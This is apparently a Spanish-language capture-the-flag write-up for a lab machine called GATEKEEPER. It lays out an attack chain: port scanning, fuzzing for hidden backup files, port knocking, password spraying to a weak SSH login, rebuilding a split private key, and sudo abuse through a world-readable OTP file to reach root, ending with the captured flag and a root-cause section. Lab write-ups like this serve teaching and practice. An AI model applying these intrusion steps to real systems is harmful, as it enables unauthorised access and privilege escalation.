# GATEKEEPER — Cadena de ataque (resumen operativo)

```
[1] nmap -p- 172.17.0.2
      → 80 open (Apache) | 3306/5432 señuelos | 33333 filtered
[2] ffuf con prefijo "." en /backups/
      → /backups/.env = GKP1337P2048P4096TRON   (semilla de knocking)
      → /backups/.backup disclose el usuario "mauricio"
[3] Análisis de banners MySQL/PG → honeytokens (sin handshake), se descartan
[4] Port knocking 1337 → 2048 → 4096
      → abre 33333 (SSH OpenSSH_8.9p1, exige publickey,password)
[5] Password spray dirigido a los usernamesBSCRITA (incl. "mauricio")
      → mauricio : 143143  (credencial débil)  → login SSH válido
[6] ls /home  (como mauricio)
      → descubre los usuarios reales: developer, mauricio, sysadmin
[7] Reconstruir la clave dividida de sysadmin:
      cat /home/developer/.ssh_part1 + /home/developer/Desktop/.ssh_part2
      (ambas -r--r--r--, world-readable)
      → ssh-keygen -y confirma "sysadmin@gatekeeper"  → login como sysadmin
[8] sudo -l → NOPASSWD: /usr/local/bin/auth_root
[9] OTP=$(cat /tmp/.current_otp)  (world-readable, -rw-r--r--) ; ./.system_auth $OTP
      → crea /tmp/.otp_validated_sysadmin
      → sudo auth_root ve el marker (<60s) → exec /bin/bash (root)
[10] cat /root/flag.txt
      → GATEKEEPER{0TP_4uth3nt1c4t10n_M4st3r_2026}
```

## Artefactos clave

| Artefacto | Valor |
|-----------|-------|
| Semilla (knock) | `GKP1337P2048P4096TRON` |
| Secuencia knock | `1337 → 2048 → 4096` |
| Puerto SSH | `33333` |
| Credencial débil | `mauricio : 143143` |
| Usuarios reales | `mauricio`, `developer`, `sysadmin` |
| Clave dividida (world-readable) | `/home/developer/.ssh_part1` + `/home/developer/Desktop/.ssh_part2` → sysadmin |
| OTP pwned | `/tmp/.current_otp` (`-rw-r--r--`, legible por todos) |
| Vector privesc | `sudo NOPASSWD /usr/local/bin/auth_root` vía marker falsificado |

## Raíz del problema

El escalón crítico es un **OTP estático almacenado en un archivo legible por todos**
(`/tmp/.current_otp`) que un **binario privilegiado (`auth_root`) consume confiado en
ciegamente** mediante un marker en `/tmp`. El `.system_auth` orquestador es world-executable,
así que la lógica de escalada se dispara con la sola lectura de un archivo público.
